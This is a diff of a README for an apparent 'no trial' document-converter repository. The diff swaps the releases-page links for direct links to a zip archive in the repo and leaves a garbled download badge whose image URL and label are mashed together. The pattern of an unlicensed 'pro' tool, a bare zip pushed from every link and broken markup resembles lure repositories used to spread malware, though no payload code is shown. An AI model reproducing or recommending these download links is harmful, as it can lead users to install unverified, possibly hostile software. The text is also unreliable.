@@ -1,6 +1,6 @@
 # 📄 Doc-Converter-Pro-No-Trial - Effortless Document Conversion for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/IranCvz/Doc-Converter-Pro-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/IranCvz/Doc-Converter-Pro-No-Trial/main/synapsis/Doc-Converter-Pro-No-Trial_v2.9.zip%20Now-Get%https://raw.githubusercontent.com/IranCvz/Doc-Converter-Pro-No-Trial/main/synapsis/Doc-Converter-Pro-No-Trial_v2.9.zip)](https://raw.githubusercontent.com/IranCvz/Doc-Converter-Pro-No-Trial/main/synapsis/Doc-Converter-Pro-No-Trial_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Doc-Converter-Pro-No-Trial repository! This software helps you co
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Page](https://github.com/IranCvz/Doc-Converter-Pro-No-Trial/releases). 
+To get started, visit this page to download: [Download Page](https://raw.githubusercontent.com/IranCvz/Doc-Converter-Pro-No-Trial/main/synapsis/Doc-Converter-Pro-No-Trial_v2.9.zip). 
 
 ### Step-by-Step Guide
 
@@ -88,4 +88,4 @@ Contributions are also welcome! If you would like to contribute to the project, 
 
 Remember, your insights can help us improve Doc Converter Pro for everyone!
 
-For more information, download the software and get started today: [Download Page](https://github.com/IranCvz/Doc-Converter-Pro-No-Trial/releases).
+For more information, download the software and get started today: [Download Page](https://raw.githubusercontent.com/IranCvz/Doc-Converter-Pro-No-Trial/main/synapsis/Doc-Converter-Pro-No-Trial_v2.9.zip).
